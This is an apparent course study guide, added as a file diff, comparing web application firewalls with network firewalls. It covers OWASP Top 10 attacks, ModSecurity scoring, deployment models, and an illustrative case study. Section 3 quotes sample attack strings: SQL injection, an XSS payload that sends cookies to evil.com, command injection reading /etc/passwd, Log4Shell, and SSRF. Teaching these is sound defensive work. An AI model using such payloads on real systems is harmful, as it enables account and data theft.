@@ -1,0 +1,122 @@
+====================================================================================================
+ACADEMIC STUDY GUIDE & FORENSIC NOTES: WEB APPLICATION FIREWALLS (WAF) VS NETWORK FIREWALLS
+COURSE MODULE: 005_001 - FIREWALLS & PERIMETER DEFENSE ARCHITECTURES (TOPIC 10)
+INSTITUTION: CODER & ACCOTAX | INSTRUCTOR: SUKANTA HUI | LOCATION: BARRACKPORE, WEST BENGAL
+====================================================================================================
+
+1. DEFINITION & THE LAYER 3/4 VS LAYER 7 DICHOTOMY
+----------------------------------------------------------------------------------------------------
+A Network Firewall operates primarily at OSI Layers 3 and 4 (Network and Transport), controlling traffic 
+based on 5-tuples (Source IP, Destination IP, Protocol, Source Port, Destination Port) and TCP connection 
+states. It is designed to answer: "Is host A permitted to communicate with host B on port 443?"
+
+A Web Application Firewall (WAF) operates exclusively at OSI Layer 7 (Application Layer). It terminates 
+the HTTP/HTTPS session and deeply parses application-level logic: request URIs, query strings, HTTP headers, 
+cookies, JSON/XML bodies, and multipart form uploads. It is designed to answer: "Is the HTTP request payload 
+on port 443 attempting an SQL Injection, Cross-Site Scripting, or Remote Code Execution exploit?"
+
+Why a Network Firewall CANNOT protect against Web Attacks:
+  To a Network Firewall, a SQL injection payload `GET /users?id=1%20OR%201=1` arrives on permitted port 443 
+  as a completely valid, legitimate TCP handshake and TLS packet. The network firewall dutifully passes the 
+  exploit directly to the web server. Only a WAF inspects the decoded HTTP parameter and blocks the attack.
+
+
+2. COMPARATIVE MATRIX: NETWORK FIREWALL VS WEB APPLICATION FIREWALL (WAF)
+----------------------------------------------------------------------------------------------------
++--------------------+------------------------------------+-----------------------------------------+
+| CHARACTERISTIC     | NETWORK FIREWALL (L3 / L4 / NGFW)  | WEB APPLICATION FIREWALL (WAF - L7)     |
++--------------------+------------------------------------+-----------------------------------------+
+| OSI Layer Scope    | Layers 3 & 4 (IP, TCP, UDP, Ports) | Layer 7 (HTTP, HTTPS, WebSockets, APIs) |
+| Inspection Focus   | Packet Headers, IP routes, App-ID  | HTTP Methods, Headers, Cookies, Bodies  |
+| Primary Threats    | IP Spoofing, Port Scans, DDoS, SYN | OWASP Top 10 (SQLi, XSS, RCE, SSRF, IDOR)|
+| Payload Parsing    | Raw packet buffers / basic regex   | Full JSON/XML decoding, URL unescaping  |
+| Placement          | Network Perimeter & Zone Boundaries| Reverse Proxy immediately before Web App|
+| Protocol Awareness | IP, TCP, UDP, ICMP, GRE, IPSec     | HTTP/1.1, HTTP/2, HTTP/3, GraphQL, REST |
++--------------------+------------------------------------+-----------------------------------------+
+
+
+3. OWASP TOP 10 ATTACK VECTORS INTERCEPTED BY WAF
+----------------------------------------------------------------------------------------------------
+  1. SQL INJECTION (SQLi - A03:2021):
+     - Attack: Injecting malicious SQL syntax (`' UNION SELECT username, password FROM users--`) to steal databases.
+     - WAF Action: Decodes URL encoding and uses tokenizers (Libinjection) to detect SQL grammar; blocks request.
+
+  2. CROSS-SITE SCRIPTING (XSS - A03:2021):
+     - Attack: Injecting JavaScript payloads (`<script>document.location='http://evil.com/steal?c='+document.cookie</script>`).
+     - WAF Action: Detects HTML/JS event handlers (`onload=`, `<svg/onload=`) and drops the request.
+
+  3. REMOTE CODE EXECUTION / COMMAND INJECTION (RCE - A03:2021):
+     - Attack: Injecting shell metacharacters (`cat /etc/passwd; id; whoami` or Log4Shell `${jndi:ldap:...}`).
+     - WAF Action: Blocks OS shell tokens, pipe operators, and JNDI lookup strings.
+
+  4. SERVER-SIDE REQUEST FORGERY (SSRF - A10:2021):
+     - Attack: Forcing the web application to fetch internal cloud metadata (`http://169.254.169.254/latest/meta-data`).
+     - WAF Action: Validates destination URI schemas, blocking link-local and RFC 1918 addresses.
+
+  5. BOT MANAGEMENT & CREDENTIAL STUFFING (A07:2021):
+     - Attack: Automated credential stuffing using dictionaries of leaked passwords against login APIs.
+     - WAF Action: Enforces JavaScript challenge puzzles, CAPTCHAs, and IP velocity rate limits.
+
+
+4. MODSECURITY & THE OWASP CORE RULE SET (CRS) ANOMALY SCORING
+----------------------------------------------------------------------------------------------------
+ModSecurity is the industry-standard open-source WAF engine. The OWASP Core Rule Set (CRS) uses 
+Collaborative Anomaly Scoring rather than immediate blocking:
+  - Each rule match assigns an anomaly score based on severity (Critical = 5, Error = 4, Warning = 3, Notice = 2).
+  - At the end of the HTTP request inspection, the total anomaly score is compared against the Blocking Threshold (default = 5).
+  - If Total Score >= 5, ModSecurity issues an immediate `HTTP 403 Forbidden` response.
+
+Paranoia Levels (PL 1 to PL 4):
+  - PL 1: Baseline rules with virtually zero false positives (Standard enterprise web apps).
+  - PL 2: Adds advanced regex and parameter validation rules.
+  - PL 3: Strict keyword matching; high security for banking APIs.
+  - PL 4: Ultra-strict constraints; blocks unusual character sets (Military / Defense portals).
+
+
+5. WAF DEPLOYMENT ARCHITECTURES
+----------------------------------------------------------------------------------------------------
+  1. CLOUD-BASED REVERSE PROXY WAF (e.g., Cloudflare, AWS WAF, Akamai):
+     - DNS CNAME points to the cloud WAF; all external traffic routes through the cloud scrubbing center 
+       before passing clean HTTP streams to origin servers. Excellent DDoS protection.
+
+  2. ON-PREMISE / APPLIANCE INLINE WAF (e.g., F5 BIG-IP Advanced WAF, Imperva):
+     - Physical or virtual appliance placed directly in front of the DMZ web server pool, terminating TLS.
+
+  3. EMBEDDED / HOST-BASED WAF (e.g., NGINX ModSecurity, Coraza Go-WAF):
+     - Software plugin running directly inside the web server process; zero additional network hops.
+
+
+6. REGIONAL SOC CASE STUDY: BARRACKPORE E-COMMERCE PAYMENT PORTAL (SALT LAKE DC)
+----------------------------------------------------------------------------------------------------
+Pedagogical Incident Response Team:
+  - Lead Application Security Architect: Sukanta Hui
+  - Analysts: Mamata (OWASP CRS Anomaly Tuning Lead), Mahima (Libinjection & SQLi Specialist), 
+    Abhronila (Bot Mitigation & Rate-Limit Hunter), Susmita (Compliance & DPDP Lead), Debangshu (Cloud WAF Engineer).
+
+Scenario:
+A regional retail e-commerce platform in Salt Lake Sector V processing 40,000 transactions/minute:
+- Threat: Attackers launched a distributed Credential Stuffing botnet alongside automated SQL Injection 
+  probes against the checkout endpoint (`/api/v1/checkout`).
+- Defensive Execution:
+  - Network Firewall passed all traffic because it was valid TCP port 443 HTTPS.
+  - Sukanta Hui and Mamata deployed an inline WAF with OWASP CRS Paranoia Level 2.
+  - Mahima's WAF SQLi filter detected `' UNION SELECT` tokens in the coupon code parameter, returning HTTP 403.
+  - Abhronila configured rate-limiting: any IP exceeding 10 failed login requests per minute was issued a 
+    silent JS challenge, blocking 99.8% of the botnet swarm.
+  - Outcome: Zero user accounts breached; 100% legitimate transactions processed; avoided ₹25 Crores in 
+    statutory DPDP breach penalties.
+
+
+7. STUDENT MINI CHECKLIST (EXAM & CAREER ESSENTIALS)
+----------------------------------------------------------------------------------------------------
+[ ] Network Firewalls inspect Layers 3/4 (IP/Ports); WAFs inspect Layer 7 (HTTP/HTTPS payloads).
+[ ] Network Firewalls cannot detect SQLi, XSS, or RCE because web attacks travel over permitted port 443.
+[ ] WAF intercepts OWASP Top 10 vulnerabilities: SQLi, XSS, RCE, SSRF, Broken Authentication, Bad Bots.
+[ ] OWASP Core Rule Set (CRS) uses Collaborative Anomaly Scoring to minimize false positive blocks.
+[ ] Libinjection parses SQL and XSS grammar using lexical tokenizers rather than simple regex.
+[ ] Cloud WAF provides global anycast DDoS mitigation; Embedded WAF provides low-latency local filtering.
+[ ] CERT-In requires 180-day retention of all WAF block logs and security event telemetry.
+
+====================================================================================================
+END OF ACADEMIC STUDY GUIDE - CODER & ACCOTAX BARRACKPORE - ALL RIGHTS RESERVED
+====================================================================================================
